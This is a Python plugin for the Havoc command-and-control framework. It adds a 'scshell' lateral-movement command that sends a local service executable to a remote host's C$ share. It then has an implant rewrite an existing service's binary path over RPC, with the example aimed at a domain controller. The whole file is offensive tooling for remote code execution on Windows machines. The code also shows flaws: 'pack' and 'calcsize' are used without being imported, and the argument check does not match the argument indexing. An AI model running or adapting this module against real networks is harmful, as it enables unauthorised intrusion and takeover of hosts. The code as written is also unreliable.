from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists

class Packer:
    def __init__(self):
        self.buffer : bytes = b''
        self.size   : int   = 0

    def getbuffer(self):
        return pack("<L", self.size) + self.buffer

    def addstr(self, s):
        if isinstance(s, str):
            s = s.encode("utf-8")
        fmt = "<L{}s".format(len(s) + 1)
        self.buffer += pack(fmt, len(s)+1, s)
        self.size += calcsize(fmt)

def scshell( demonID, *param ):
    TaskID : str    = None
    demon  : Demon  = None
    packer : Packer = Packer()

    Host      : str   = ""
    SvcName   : str   = ""
    SvcPath   : str   = ""
    SvcBinary : bytes = b''

    demon = Demon( demonID )

    if len(param) < 3:
        demon.ConsoleWrite( demon.CONSOLE_ERROR, "Not enough arguments" )
        return
    else: 
        Host    = param[ 1 ]
        SvcName = param[ 2 ]
        SvcPath = param[ 3 ]

        if exists( SvcPath ) == False:
            demon.ConsoleWrite( demon.CONSOLE_ERROR, f"Service executable not found: {SvcPath}" )
            return
        else:
            SvcBinary = open( SvcPath, 'rb' ).read()
            if len(SvcBinary) == 0:
                demon.ConsoleWrite( demon.CONSOLE_ERROR, "Specified service executable is empty" )
                return

    TaskID = demon.ConsoleWrite( demon.CONSOLE_TASK, f"Tasked demon to execute {SvcPath} on {Host} using scshell" )

    packer.addstr( Host )
    packer.addstr( SvcName )
    packer.addstr( SvcBinary )
    packer.addstr( "\\\\" + Host + "\\C$\\Windows\\" + SvcName + ".exe" )

    demon.InlineExecute( TaskID, "go", f"scshell.{demon.ProcessArch}.o", packer.getbuffer(), False )

    return TaskID

RegisterModule( "jump-exec", "lateral movement module", "", "[exploit] (args)", "", ""  )
RegisterCommand( scshell, "jump-exec", "scshell", "Changes service executable path of an existing service to our specified service executable over RPC", 0, "[Host] [Target Service Name] [Local Path]", "DOMAIN-DC AppVClient /tmp/MyAgentSvc.exe" )
